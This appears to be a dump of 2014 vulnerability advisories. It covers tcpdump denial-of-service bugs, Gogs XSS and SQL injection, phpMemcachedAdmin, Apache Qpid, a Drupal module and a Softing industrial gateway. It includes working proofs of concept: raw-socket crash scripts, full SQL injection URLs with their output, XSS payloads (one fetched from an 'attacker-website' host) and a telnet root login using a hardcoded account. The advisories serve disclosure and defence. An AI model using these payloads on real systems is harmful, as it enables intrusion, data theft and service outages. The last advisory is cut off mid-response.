The information herein contained may change without notice. Use of this information constitutes acceptance for use in an AS IS condition. There are NO warranties, implied or otherwise, with regard to this information or its use. Any use of this information is at the user's risk. In no event shall the author/distributor (Portcullis Computer Security Limited) be held liable for any damages whatsoever arising out of or in connection with the use or spread of this information.
###############################################################
This email originates from the systems of Portcullis
Computer Security Limited, a Private limited company,
registered in England in accordance with the Companies
Act under number 02763799. The registered office
address of Portcullis Computer Security Limited is:
Portcullis House, 2 Century Court, Tolpits Lane, Watford,
United Kingdom, WD18 9RS.
The information in this email is confidential and may be
legally privileged. It is intended solely for the addressee.
Any opinions expressed are those of the individual and
do not represent the opinion of the organisation. Access
to this email by persons other than the intended recipient
is strictly prohibited.
If you are not the intended recipient, any disclosure,
copying, distribution or other action taken or omitted to be
taken in reliance on it, is prohibited and may be unlawful.
When addressed to our clients any opinions or advice
contained in this email is subject to the terms and
conditions expressed in the applicable Portcullis Computer
Security Limited terms of business.
###############################################################
#####################################################################################
This e-mail message has been scanned for Viruses and Content and cleared
by MailMarshal.
#####################################################################################"
5850,CVE-2014-8769 tcpdump unreliable output using malformed AOVD payload,,CVE-2014-8769,"CVE-2014-8769 tcpdump unreliable output using malformed AOVD payload
1. Background
tcpdump is a powerful command-line packet analyzer. It allows the user to intercept and display TCP/IP and other packets being transmitted or received over a network to which the computer is attached.
2. Summary Information
It was found out that malformed network traffic (AOVD-based) can lead to an abnormal behaviour if verbose output of tcpdump monitoring the network is used.
3. Technical Description
The application decoder for the Ad hoc On-Demand Distance Vector (AODV) protocol fails to perform input validation and performs unsafe out-of-bound accesses. The application will usually not crash, but perform out-of-bounds accesses and output/leak larger amounts of invalid data, which might lead to dropped packets. It is unknown if other payload exists that might trigger segfaults.
To reproduce start tcpdump on a network interface
sudo tcpdump -i lo -s 0 -n -v
(running the program with sudo might hide a possible segfault message on certain environments, see dmesg for details)
and use the following python program to generate a frame on the network (might also need sudo):
#!/usr/bin/env python
from socket import socket, AF_PACKET, SOCK_RAW
s = socket(AF_PACKET, SOCK_RAW)
s.bind((""lo"", 0))
aovd_frame = ""x00x00x00x00x00x00x00x00x8cx7axdfx6fx08x00x45x00xe6x3dxf3x7fx40x00x40x11x30xc6x0ax01x01x68x0ax02x02x02x02x8ex0dx00x4bx00x00xe8x12x00x00x00x00x1fxc6x51x35x97x00x24x8cx7axdfx6fx08x00x45x00xe6x3dxf3x7fx40x00x40x11x30xc6x0ax01x01""
s.send(aovd_frame)
4. Affected versions
Affected versions are 3.8 through 4.6.2
5. Fix
The problem is fixed in the upcoming version tcpdump 4.7.0
6. Advisory Timeline
2014-11-08 Discovered
2014-11-09 Requested CVE
2014-11-11 Reported vendor by email
2014-11-12 Vendor made a fix available as repository patch
2014-11-13 CVE number received
2014-11-13 Published CVE advisory
7. Credit
The issue was found by
Steffen Bauch
Twitter: @steffenbauch
http://steffenbauch.de
using a slightly enhanced version of american fuzzy lop (https://code.google.com/p/american-fuzzy-lop/) created by Michal Zalewski."
5851,CVE-2014-8768 tcpdump denial of service in verbose mode using malformed Geonet payload,,CVE-2014-8768,"CVE-2014-8768 tcpdump denial of service in verbose mode using malformed Geonet payload
1. Background
tcpdump is a powerful command-line packet analyzer. It allows the user to intercept and display TCP/IP and other packets being transmitted or received over a network to which the computer is attached.
2. Summary Information
It was found out that malformed network traffic (Geonet-based) can lead to an application crash (denial of service) if verbose output of tcpdump monitoring the network is used.
3. Technical Description
The application decoder for the geonet protocol fails to perform external input validation and performs insufficient checking on length computations leading to an unsafe decrement and underflow in the function
geonet_print(netdissect_options *ndo, const u_char *eth, const u_char *bp, u_int length)
The affected variable is length which is later on used to print a memory chunk which eventually leads to a segfault. The function contains several unsafe computations updating the length variable.
To reproduce start tcpdump on a network interface
sudo tcpdump -i lo -s 0 -n -v
(running the program with sudo might hide the segfault message on certain environments, see dmesg for details)
and use the following python program to generate a frame on the network (might also need sudo):
#!/usr/bin/env python
from socket import socket, AF_PACKET, SOCK_RAW
s = socket(AF_PACKET, SOCK_RAW)
s.bind((""lo"", 0))
geonet_frame = ""x00x1fxc6x51x07x07x07x07x07x07x07x07x07x07xc6x51x07x07x07x07x07x07xefx06x07x35x97x00x24x8cx7axdfx6fx08x00x45x00x00x3dxf3x7fx40x00x40x11x30xc6x0ax01x01x68x0ax01x01x01x99x80x00x35x00x29x16xa5x01x76x01x00x00xffx00x00x01x00x00x00""
s.send(geonet_frame)
4. Affected versions
Affected versions are 4.5.0 through 4.6.2
(segfaults were reproducible in versions up to 4.6.1 on Ubuntu 14.04, but not reliably in 4.6.2. Code audit showed that unsafe computations are performed in 4.6.2, but the trigger frame might need to look different).
5. Fix
The problem is fixed in the upcoming version tcpdump 4.7.0
6. Advisory Timeline
2014-11-08 Discovered
2014-11-09 Requested CVE
2014-11-11 Reported vendor by email
2014-11-12 Vendor made a fix available as repository patch
2014-11-13 CVE number received
2014-11-13 Published CVE advisory
7. Credit
The issue was found by
Steffen Bauch
Twitter: @steffenbauch
http://steffenbauch.de
using a slightly enhanced version of american fuzzy lop (https://code.google.com/p/american-fuzzy-lop/) created by Michal Zalewski."
5852,CVE-2014-8767 tcpdump denial of service in verbose mode using malformed OLSR payload,,CVE-2014-8767,"CVE-2014-8767 tcpdump denial of service in verbose mode using malformed OLSR payload
1. Background
tcpdump is a powerful command-line packet analyzer. It allows the user to intercept and display TCP/IP and other packets being transmitted or received over a network to which the computer is attached.
2. Summary Information
It was found out that malformed network traffic (OLSR-based) can lead to an application crash (denial of service) if verbose output of tcpdump monitoring the network is used.
3. Technical Description
The application decoder for the OLSR protocol fails to perform external input validation and performs insufficient checking on length computations leading to an unsafe decrement and underflow in the function
olsr_print (const u_char *pptr, u_int length, int is_ipv6)
In this function msg_len is extracted from the input without sufficient checks and subtracted sizeof(struct olsr_msg4) which leads to an underflow of msg_tlen which is used to call olsr_print_neighbor() which will crash. In case DNS reverse lookup is enabled, this will also lead to a large amount of invalid DNS reverse lookups.
To reproduce start tcpdump on a network interface
sudo tcpdump -i lo -s 0 -n -v
(running the program with sudo might hide the segfault message on certain environments, see dmesg for details)
and use the following python program to generate a frame on the network (might also need sudo):
#!/usr/bin/env python
from socket import socket, AF_PACKET, SOCK_RAW
s = socket(AF_PACKET, SOCK_RAW)
s.bind((""lo"", 0))
olsr_frame = ""x00x1bxc6x51x35x97x00x24x8cx7axffx6fx08x00x45x15x00x3dxf3x7fx40x00x4dx11x30xc6x0ax01x01x68x0ax02x02x02x02xbax02x02x02x02x02x02x02x02x02x02x02x20x00x02x02x02x02x02x02x02x02x02x02x02x02x02x02x02x02x02x02x02x02x02x20x01x00x00x00""
s.send(olsr_frame)
4. Affected versions
Affected versions are 3.9.6 through 4.6.2
5. Fix
The problem is fixed in the upcoming version tcpdump 4.7.0
6. Advisory Timeline
2014-11-08 Discovered
2014-11-09 Requested CVE
2014-11-11 Reported vendor by email
2014-11-12 Vendor made a fix available as repository patch
2014-11-13 CVE number received
2014-11-13 Published CVE advisory
7. Credit
The issue was found by
Steffen Bauch
Twitter: @steffenbauch
http://steffenbauch.de
using a slightly enhanced version of american fuzzy lop (https://code.google.com/p/american-fuzzy-lop/) created by Michal Zalewski."
5861,CVE-2014-8683 XSS in Gogs Markdown Renderer,,CVE-2014-8683,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: RIPEMD160
XSS in Gogs Markdown Renderer
=============================
Researcher: Timo Schmid <tschmid ernw de>
Description
===========
Gogs(Go Git Service) is a painless self-hosted Git Service written in
Go. (taken
from [1])
It is very similiar to the github hosting plattform. Multiple users can
create
multiple repositories and share code with others with the git version
control
system. Repositories can be marked as public or private to prevent
access from
unauthorized users.
Gogs provides two api views to transform markdown into HTML at the urls
/api/v1/markdown and /api/v1/markdown/raw
The transformation is vulnerable to XSS.
Exploitation Technique:
=======================
Remote
Severity Level:
===============
Medium
CVSS Base Score
===============
4.3 (AV:N / AC:M / Au:N / C:P / I:N / A:N)
CVE-ID
======
CVE-2014-8683
Impact
======
The vulnerability could be used together with social engineering attacks
to gain
access to restricted resources by extracting authentication tokens from
cookies
or by executing commands in the context of the logged in victim.
Status
======
Not fixed
Vulnerable Code Section
=======================
models/issue.go:
[...]
func RenderMarkdown(rawBytes []byte, urlPrefix string) []byte {
body := RenderSpecialLink(rawBytes, urlPrefix)
body = RenderRawMarkdown(body, urlPrefix)
return body
}
func RenderMarkdownString(raw, urlPrefix string) string {
return string(RenderMarkdown([]byte(raw), urlPrefix))
}
[...]
Proof of Concept
================
Form to trigger XSS:
<form action=""http://example.com/api/v1/markdown"" method=""post"">
<input name=""text"" value=""&lt;img
onerror=&quot;alert(&amp;quot;XSS&amp;quot;)
&quot; src=&quot;x&quot;&gt;"">
<input type=""submit"">
</form>
Response:
<p><img onerror=""alert(&quot;XSS&quot;)"" src=""x""></p>
Solution
========
The markdown processing should reject or filter any HTML input and
process only
markdown content.
Affected Versions
=================
>= v0.3.1-9-g49dc57e
Timeline
========
2014-09-25: Developer informed
2014-10-16: Contact of developer regarding fix
2014-10-25: Working together with developer on fix
2014-11-03: Contacted developer
2014-11-14: CVE-ID assigned
Credits
=======
Pascal Turbing <pturbing ernw de>
Jiahua (Joe) Chen <u gogs io>
References
==========
[1] https://github.com/gogits/gogs
[2] http://gogs.io/
[3] https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
[4] https://www.ernw.de/download/BC-1404.txt
Advisory-ID
===========
BC-1404
Disclaimer
==========
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO
warranties, implied or otherwise, with regard to this information or its
use.
Any use of this information is at the user's risk. In no event shall the
author/
distributor be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information.
- --
Timo Schmid
ERNW GmbH, Carl-Bosch-Str. 4, 69115 Heidelberg - www.ernw.de
Tel. +49 6221 480390 - Fax 6221 419008 - Cell +49 151 16227192
PGP-FP 971B D4F7 5DD1 FCED 11FC 2C61 7AB6 927D 6F26 6CE0
Handelsregister Mannheim: HRB 337135
Geschaeftsfuehrer: Enno Rey
==============================================================
|| Blog: www.insinuator.net | | Conference: www.troopers.de ||
==============================================================
================== TROOPERS15 ==================
* International IT Security Conference & Workshops
* 16th - 20st March 2015 / Heidelberg, Germany
* www.troopers.de
====================================================
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQEcBAEBAwAGBQJUZlGDAAoJEHq2kn1vJmzgr28H/20Yb2h9Wj7eUD7/L8jggNVz
QISEQYsS6tuUGM59fYNRj7qGa/PnX5biaW3qD2Zy3erS+CfO4pFOGMZcjFSyNrL5
sFZmVAYftGnPLYTFh2Wt4iV3Yx3CgPzdlYZFSqXDynw5xWokSTqnlquwiUrIG1JW
45CYitwsTd9KzaoCMzeQeiPbSbjrZ+kQyM6+iMuBTqyfpbIf1A4kpJi0sULEU/a2
fMPUmlFoFBSlIfxUXKY8sRcritZHI9GiMnVOGsHxtW3RSszP3MfNDu0uJ4AaAHRF
3J1AH2DCuKrig9rMxUWzI3RrogOc5HrQYIIhM2gv8E7W2xkP4Ypozxwaw7JwBS4=
=uWDU
-----END PGP SIGNATURE-----"
5862,CVE-2014-8682 Multiple Unauthenticated SQL Injections in Gogs,,CVE-2014-8682,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: RIPEMD160
Unauthenticated SQL Injection in Gogs repository search
=======================================================
Researcher: Timo Schmid <tschmid ernw de>
Description
===========
Gogs(Go Git Service) is a painless self-hosted Git Service written in
Go. (taken
from [1])
It is very similiar to the github hosting plattform. Multiple users can
create
multiple repositories and share code with others with the git version
control
system. Repositories can be marked as public or private to prevent
access from
unauthorized users.
Gogs provides an api view to give javascript code the possibility to
search for
existing repositories in the system. This view is accessible at
/api/v1/repos/search?q=<search query>.
The q Parameter of this view is vulnerable to SQL injection.
Exploitation Technique
======================
Remote
Severity Level
==============
Critical
CVSS Base Score
===============
8.3 (AV:N / AC:M / Au:N / C:C / I:P / A:P)
CVE-ID
======
CVE-2014-8682
Impact
======
The vulnerability results at least in a complete compromise of the database.
Depending on the particular database configuration a compromise of the
system
is also possible.
Status
======
Fixed by Vendor
Vulnerable Code Section
=======================
models/repo.go:
[...]
// SearchRepositoryByName returns given number of repositories whose name
contains keyword.
func SearchRepositoryByName(opt SearchOption) (repos []*Repository, err
error) {
// Prevent SQL inject.
opt.Keyword = FilterSQLInject(opt.Keyword)
if len(opt.Keyword) == 0 {
return repos, nil
}
opt.Keyword = strings.ToLower(opt.Keyword)
repos = make([]*Repository, 0, opt.Limit)
// Append conditions.
sess := x.Limit(opt.Limit)
if opt.Uid > 0 {
sess.Where(""owner_id=?"", opt.Uid)
}
if !opt.Private {
sess.And(""is_private=false"")
}
sess.And(""lower_name like '%"" + opt.Keyword + ""%'"").Find(&repos)
return repos, err
}
[...]
The vulnerability exists because of a string concatination in the SQL
query with
user supplied data. Because of the SQL filter at the method entry, attackers
can't use spaces (0x20) and since v0.5.6.1025-g83283b commas are also
filtered.
Proof of Concept
================
Request:
http://www.example.com/api/v1/repos/search?q=%27)%09UNION%09SELECT%09*%09FROM%09
(SELECT%09null)%09AS%09a1%09%09JOIN%09(SELECT%091)%09as%09u%09JOIN%09(SELECT%09
user())%09AS%09b1%09JOIN%09(SELECT%09user())%09AS%09b2%09JOIN%09(SELECT%09null)
%09as%09a3%09%09JOIN%09(SELECT%09null)%09as%09a4%09%09JOIN%09(SELECT%09null)%09
as%09a5%09%09JOIN%09(SELECT%09null)%09as%09a6%09%09JOIN%09(SELECT%09null)%09as
%09a7%09%09JOIN%09(SELECT%09null)%09as%09a8%09%09JOIN%09(SELECT%09null)%09as%09
a9%09JOIN%09(SELECT%09null)%09as%09a10%09JOIN%09(SELECT%09null)%09as%09a11%09
JOIN%09(SELECT%09null)%09as%09a12%09JOIN%09(SELECT%09null)%09as%09a13%09%09JOIN
%09(SELECT%09null)%09as%09a14%09%09JOIN%09(SELECT%09null)%09as%09a15%09%09JOIN
%09(SELECT%09null)%09as%09a16%09%09JOIN%09(SELECT%09null)%09as%09a17%09%09JOIN
%09(SELECT%09null)%09as%09a18%09%09JOIN%09(SELECT%09null)%09as%09a19%09%09JOIN
%09(SELECT%09null)%09as%09a20%09%09JOIN%09(SELECT%09null)%09as%09a21%09%09JOIN
%09(SELECT%09null)%09as%09a22%09where%09(%27%25%27=%27
Response:
{""data"":[{""repolink"":""bluec0re/test""},{""repolink"":""bluec0re/secret""},{""repolink""
:""bluec0re/root@localhost""}],""ok"":true}
Solution
========
This vulnerability could easily be fixed by using prepared statements:
sess.And(""lower_name like ?"", ""%"" + opt.Keyword + ""%"").Find(&repos)
Update to version 0.5.6.1105.
Affected Versions
=================
>= v0.3.1-9-g49dc57e
<= v0.5.6.1104-g0c5ba45
Timeline
========
2014-09-25: Developer informed
2014-10-16: Contact of developer regarding fix
2014-10-25: Working together with developer on fix
2014-11-03: Contacted developer
2014-11-04: Fixed in master branch
2014-11-14: CVE-ID assigned
Credits
=======
Pascal Turbing <pturbing ernw de>
Jiahua (Joe) Chen <u gogs io>
References
==========Update to version 0.5.6.1105.
[1] https://github.com/gogits/gogs
[2] http://gogs.io/
[3]
http://www.insinuator.net/2012/05/sql-injection-testing-for-business-purposes-part-1/
[4]
http://www.insinuator.net/2012/05/sql-injection-testing-for-business-purposes-part-2/
[5]
http://www.insinuator.net/2012/06/sql-injection-testing-for-business-purposes-part-3/
[6] https://www.ernw.de/download/BC-1402.txt
Advisory-ID
===========
BC-1402
Disclaimer
==========
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO
warranties, implied or otherwise, with regard to this information or its
use.
Any use of this information is at the user's risk. In no event shall the
author/
distributor be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information.
Unauthenticated SQL Injection in Gogs user search
=================================================
Researcher: Timo Schmid <tschmid ernw de>
Description
===========
Gogs(Go Git Service) is a painless self-hosted Git Service written in
Go. (taken
from [1])
It is very similiar to the github hosting plattform. Multiple users can
create
multiple repositories and share code with others with the git version
control
system. Repositories can be marked as public or private to prevent
access from
unauthorized users.
Gogs provides an api view to give javascript code the possibility to
search for
existing users in the system. This view is accessible at
/api/v1/users/search?q=<search query>.
The q Parameter of this view is vulnerable to SQL injection.
Exploitation Technique:
=======================
Remote
Severity Level:
===============
Critical
CVSS Base Score
===============
8.3 (AV:N / AC:M / Au:N / C:C / I:P / A:P)
CVE-ID
======
CVE-2014-8682
Impact
======
The vulnerability results at least in a complete compromise of the database.
Depending on the particular database configuration a compromise of the
system
is also possible.
Status
======
Fixed by Vendor
Vulnerable Code Section
=======================
models/user.go:
[...]
// SearchUserByName returns given number of users whose name contains
keyword.
func SearchUserByName(opt SearchOption) (us []*User, err error) {
opt.Keyword = FilterSQLInject(opt.Keyword)
if len(opt.Keyword) == 0 {
return us, nil
}
opt.Keyword = strings.ToLower(opt.Keyword)
us = make([]*User, 0, opt.Limit)
err = x.Limit(opt.Limit).Where(""type=0"").And(""lower_name like '%"" +
opt.Keyword + ""%'"").Find(&us)
return us, err
}
[...]
The vulnerability exists because of a string concatination in the SQL
query with
user supplied data. Because of the SQL filter at the method entry, attackers
can't use spaces (0x20) and since v0.5.6.1025-g83283b commas are also
filtered.
Proof of Concept
================
Request:
http://www.example.com/api/v1/users/search?q='/**/and/**/false)/**/union/**/
select/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,
null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from
/**/mysql.db/**/where/**/('%25'%3D'
Response:
{""data"":[{""username"":""5.5.40-0ubuntu0.14.04.1"",""avatar"":
""//1.gravatar.com/avatar/""}],""ok"":true}
Solution
========
This vulnerability could easily be fixed by using prepared statements:
err = x.Limit(opt.Limit).Where(""type=0"").And(""lower_name like ?"", ""%"" +
opt.Keyword + ""%"").Find(&us)
Update to version 0.5.6.1105.
Affected Versions
=================
>= v0.3.1-9-g49dc57e
<= v0.5.6.1104-g0c5ba45
Timeline
========
2014-09-25: Developer informed
2014-10-16: Contact of developer regarding fix
2014-10-25: Working together with developer on fix
2014-11-03: Contacted developer
2014-11-04: Fixed in master branch
2014-11-14: CVE-ID assigned
Credits
=======
Pascal Turbing <pturbing ernw de>
Jiahua (Joe) Chen <u gogs io>
References
==========
[1] https://github.com/gogits/gogs
[2] http://gogs.io/
[3]
http://www.insinuator.net/2012/05/sql-injection-testing-for-business-purposes-part-1/
[4]
http://www.insinuator.net/2012/05/sql-injection-testing-for-business-purposes-part-2/
[5]
http://www.insinuator.net/2012/06/sql-injection-testing-for-business-purposes-part-3/
[6] https://www.ernw.de/download/BC-1403.txt
Advisory-ID
===========
BC-1403
Disclaimer
==========
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO
warranties, implied or otherwise, with regard to this information or its
use.
Any use of this information is at the user's risk. In no event shall the
author/
distributor be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information.
- --
Timo Schmid
ERNW GmbH, Carl-Bosch-Str. 4, 69115 Heidelberg - www.ernw.de
Tel. +49 6221 480390 - Fax 6221 419008 - Cell +49 151 16227192
PGP-FP 971B D4F7 5DD1 FCED 11FC 2C61 7AB6 927D 6F26 6CE0
Handelsregister Mannheim: HRB 337135
Geschaeftsfuehrer: Enno Rey
==============================================================
|| Blog: www.insinuator.net | | Conference: www.troopers.de ||
==============================================================
================== TROOPERS15 ==================
* International IT Security Conference & Workshops
* 16th - 20st March 2015 / Heidelberg, Germany
* www.troopers.de
====================================================
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQEcBAEBAwAGBQJUZlFzAAoJEHq2kn1vJmzgK5wH/1R10U9qNTcEGBv0R3L5VEyN
29r8ViIQi2zfhC3zCQW/xpSJSrqyNaybwJgrF8B3JHTnGavkLSWgwAhiy/cB0b+A
/L/AV2dtvFj/S3pcCdBJwVMKixmOUAhDHuI82Opao+nMRjmMJvODYfpwBMxFBLYf
ZI7lhxm+R7eKGuIcL6dCXHN4QoukSTmRK6iwbswEwth8cOFBoxK/WRkuEytJ0aB9
g865IWCkloJQtht8A6AjnDm7om7drhcbL+NEXcbBg7LL8S//bFMF9EHdll4h7ueG
5HMZyfpzVctDola62u7wKqq56PzJoG6nU61S3020gkeNP8HlNGf8K7gM5lQjKzs=
=x03c
-----END PGP SIGNATURE-----"
5863,Re: CVE-2014-8732,,CVE-2014-8732,We successfully contacted the author. He is currently working on patching the issue in the next version.
5864,Re: CVE-2014-8731 - RCE in phpMemcachedAdmin <=1.2.2,,CVE-2014-8731,We successfully contacted the author. He is currently working on patching the issue in the next version.
5868,CVE-2014-8732,,CVE-2014-8732,"CVE-2014-8732
CVSSv2 Vector:
[AV:N/AC:L/Au:N/C:P/I:P/A:P/E:H/RL:U/RC:C]
CVSSv2 Base Score=7.5
CVSSv2 Temp Score=7.5
OWASP Top 10 classification: A3 - Cross Site Scripting
There is a stored xss vulnerability in phpMemcachedAdmin. Most of the user-specified input fields which are displayed on several pages of the application aren't properly escaped (lack of output enconding).
All versions prior and including the current version 1.2.2 are affected as far as we know."
5869,CVE-2014-8731 - RCE in phpMemcachedAdmin <=1.2.2,,CVE-2014-8731,"CVE-2014-8731
CVSSv2 Vector:
[AV:N/AC:L/Au:N/C:C/I:C/A:C/E:F/RL:U/RC:C]
CVSSv2 Base Score=10.0
CVSSv2 Temp Score=9.5
OWASP Top 10 classification: A1 - Injection
PHPMemcachedAdmin is a web-based frontend for Linux's memcached Daemon.
Project Homepage:
https://code.google.com/p/phpmemcacheadmin/
Download Site:
http://blog.elijaa.org/index.php?pages/phpMemcachedAdmin-Download
PHPMemcachedAdmin stores data in the server's filesystem.
Part of the serialized data and the last part of the concatenated filename may be specified by the user, which can lead to remote code execution e.g. if a php script is created and placed within the webserver's document root.
All versions prior and including the current version 1.2.2 are affected as far as we know."
5886,CVE-2014-3629: Apache Qpid's qpidd can be induced to make http requests,,CVE-2014-3629,"Apache Software Foundation - Security Advisory
Apache Qpid's qpidd can be induced to make http requests
CVE-2014-3629 CVS: 3
Severity: Low
Vendor:
The Apache Software Foundation
Versions Affected:
Apache Qpid's qpidd up to and including version
0.30, where xml exchange module is loaded
Description:
The XML exchange type is an optional, dynamically loaded module for
qpidd that allows creation of exchanges that route messages based on
evaluating an xquery expression against them.
On parsing a message sent to an XML exchange, whose body is XML
containing a link to a DTD, the broker process will attempt to
retrieve the referenced resource(s). I.e. the broker process may be
induced to make outgoing HTTP connections by publishing a message
containing links to an XML exchange.
Solution:
A patch is available that prevents any retrieval of external entities referenced in the XML. This will be included in subsequent releases, but can be applied to 0.30 if desired. https://issues.apache.org/jira/secure/attachment/12680198/QPID-6218.patch
Common Vulnerability Score information:
If the XML exchange functionality is not required, the module in
question need not be loaded at all. This can be done either by moving
the module - named xml.so - out of the module directory, or by setting
the --no-module-dir option and adding an explicit --load-module
argument for every required module.
Where the XML exchange functionality is required, authorisation may be
enabled to prevent all but trusted users from creating or publishing
to xml exchanges.
Credit:
This issue was discovered by G. Geshev from MWR Labs
Common Vulnerability Score information:
CVSS Base Score 3.5
Impact Subscore 2.9
Exploitability Subscore 6.8
CVSS Temporal Score 3
CVSS Environmental Score Not Defined
Modified Impact Subscore Not Defined
Overall CVSS Score 3"
5905,[CVE-2014-8338] Cross Site Scripting (XSS) vulnerability in videowhisper,,CVE-2014-8338,"Hello,
Cross Site Scripting (XSS) vulnerability exists in videowhisper module for Drupal 7.
Vendor Notification: 22, Oct 2014
Vulnerable file: drupal/modules/videowhisper/vwrooms/js/jsor-jcarousel/examples/special_textscroller.php
POC: http://vulnerable-website/drupal/modules/videowhisper/vwrooms/js/jsor-jcarousel/examples/special_textscroller.php?feed=http://attacker-website/xss.txt
The content of xss.txt:
<root>
<script xmlns=""http://www.w3.org/2000/svg""><![CDATA[
alert('XSS');
]]></script>
</root>
Discovered by Mahmoud Ghorbanzadeh, in Amirkabir University of Technology's Scientific Excellence and Research Centers.
Best regards"
5914,CVE-2014-6617 Softing FG-100 Backdoor Account,,CVE-2014-6617,"#############################################################
#
# COMPASS SECURITY ADVISORY
# http://www.csnc.ch/en/downloads/advisories.html
#
#############################################################
#
# Product: Softing FG-100 PB
# Vendor: Softing AG (www.softing.com)
# CVD ID: CVE-2014-6617
# Subject: Backdoor Account
# Risk: High
# Effect: Remotely exploitable
# Author: Ingmar Rosenhagen
# Daniel Marzin
# Johannes Klick
# Date: 05.11.2014
#
#############################################################
Introduction:
-------------
Softing FG PROFIBUS [1] is a family of interfaces for remote access to
one, two or three PROFIBUS segments via Ethernet for device
parameterization, controller programming and data acquisition. Compass
Security Deutschland GmbH [2] discovered a security flaw in the firmware
of the device allowing unauthorized acces to the device. The FG-100
allows access via the telnet protocol by default. The password for the
root-account is hard-coded in the device and cannot be changed by
the administrator. This allows an remote attacker
to login as root, which enables him to copy and/or alter configuration
data or other parameters of the device.
Affected:
---------
Firmware: FG-x00-PB_V2.02.0.00
Technical Description:
----------------------
The firmware for the device is delivered as a zip file containing a
uboot-image:
irosenha@kali ..100 - Firmware/fw_FG-x00-PB_V2.02.0.00 % mkimage -l
fw_FG-100-PB_V2.02.0.00.release
Image Name: FG-100-PB_V2.02.0.00.release
Created: Mon Aug 4 16:26:49 2008
Image Type: PowerPC Linux Script (gzip compressed)
Data Size: 2396096 Bytes = 2339.94 kB = 2.29 MB
Load Address: 00000000
Entry Point: 00000000
Contents:
Image 0: 249 Bytes = 0.24 kB = 0.00 MB
Image 1: 3764 Bytes = 3.68 kB = 0.00 MB
Offset = 0x7f6aa083d14c
Image 2: 2392064 Bytes = 2336.00 kB = 2.28 MB
Offset = 0x7f6aa083e000
Splitting and extracting several layers of uboot-images leaves a
CramFS-Image:
irosenha@kali ..100 - Firmware/fw_FG-x00-PB_V2.02.0.00 % file cramfs3.fs
cramfs3.fs: Linux Compressed ROM File System data, big endian size 65536 CRC
0x330b1a39, edition 634273566, 1331373096 blocks, 2944606610 files
Since this is big endian a matching VM was used to mount the image and
access it's contents. It contains a default linux filesystem with a
passwd file that holds password hashes (DES) created by mkpasswd:
irosenha@kali /tmp/media % cat etc/passwd.orig
root:fEHd4eY5[CUT BY COMPASS]:0:0:root:/root:/bin/sh
config:lGajGWwkK4[CUT BY COMPASS]:4671:100:PROFIgate
Configuration:/fw_upload:/usr/local/config/DeviceConfig
FG-100-PB:DOPnAyLPjz[CUT BY COMPASS]:4672:100:PROFIgate Dialin:/:/bin/false
nobody:x:65534:65534:nobody:/tmp:/bin/sh
Using hashcat the hash of the user root with uid 0 could be cracked and
the device accessed by this account with telnet:
root@kali /home/irosenha # telnet 192.168.2.3
Trying 192.168.2.3...
Connected to 192.168.2.3.
Escape character is '^]'.
ps login: root
Password:
BusyBox v1.00 (2008.06.06-06:20+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.
~ # cat /etc/profile
PATH=/bin:/sbin:/usr/local/bin
TZ=CET-1CEST,M3.5.0/2,M10.5.0/3
export TZ
~ # uname -a
Linux ps 2.4.4-rthal5 #1 Fri Jun 6 08:02:49 CEST 2008 ppc unknown
Workaround / Fix:
-----------------
no patch is available
Timeline:
---------
Vendor Notified: 2014-09-15
Vendor Response: 2014-10-24
Vendor Status: Wont Fix
References:
-----------
[1]:
http://industrial.softing.com/de/produkte/profibus-master-or-slave-configura
ble-single-channel-remote-interface.html
[2]: http://www.csnc.de"
5915,CVE-2014-6616 Softing FG-100 Webui XSS,,CVE-2014-6616,"#############################################################
#
# COMPASS SECURITY ADVISORY
# http://www.csnc.ch/en/downloads/advisories.html
#
#############################################################
#
# Product: Softing FG-100 PB
# Vendor: Softing AG (www.softing.com)
# CVD ID: CVE-2014-6616
# Subject: XSS
# Risk: High
# Effect: Remotely exploitable
# Author: Johannes Klick
# Daniel Marzin
# Ingmar Rosenhagen
# Date: 05.11.2014
#
#############################################################
Introduction:
-------------
Softing FG PROFIBUS [1] is a family of interfaces for remote access to
one, two or three PROFIBUS segments via Ethernet for device
parameterization, controller programming and data acquisition. This
device is used in industrial setups for making Profibus device available
via ethernet. Compass Security Deuschland GmbH [2] discovered a security
flaw in the webgui of the device which allows execution of malicious
code in the context of the user's browser session.
Affected:
---------
Firmware: FG-x00-PB_V2.02.0.00
Technical Description:
----------------------
The web gui does not properly encode output of user data in at least one
place. Exploiting this vulnerability leads to stored cross-site
scripting (XSS) and allows execution of JavaScript code
The vulnerable resource is the 'DEVICE_NAME' parameter:
POST /cgi-bin/CFGhttp HTTP/1.1
Host: 192.168.2.3
Referer: http://192.168.2.3/cgi-bin/CFGhttp
second_chance=Yes&LOGIN=config&PASSWORD=password&SERIAL_NUMBER=0110000000&DE
VICE_NAME=<SCRIPT>alert(""XSS"")</SCRIPT>&DEVICE_NAME_ORG=ROFLE&IPADDR=192.168
.2.3&IPADDR_ORG=192.168.2.3&NETMASK=255.255.255.0&NETMASK_ORG=255.255.255.0&
GATEWAY=0.0.0.0&GATEWAY_ORG=&MAINTENANCE_IP=192.168.212.231&MAINTENANCE_IP_O
RG=192.168.212.231&STARTUP=RELOAD
Which results in the malicious code being embedded:
HTTP/1.0 200 OK
Content-type: text/html
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.01
Transitional//EN""""http://www.w3.org/TR/html4/strict.dtd"">
<html><head><title>Device Configuration</title></head><link
rel=""stylesheet"" type=""text/css""
href=""../fg300_pb/styles/fg300_pb.css""><body><h1>New Network
Settings</h1><table cellspacing=0 summary=""""><tr><td><strong> Host Name
</strong></td><td> <SCRIPT>alert(""XSS"")</SCRIPT> </td><td>
</td></tr><tr><td><strong> IP Address </strong></td><td> 192.168.2.3
</td><td> </td></tr><tr><td><strong> Subnet Mask
</strong></td><td> 255.255.255.0 </td><td>
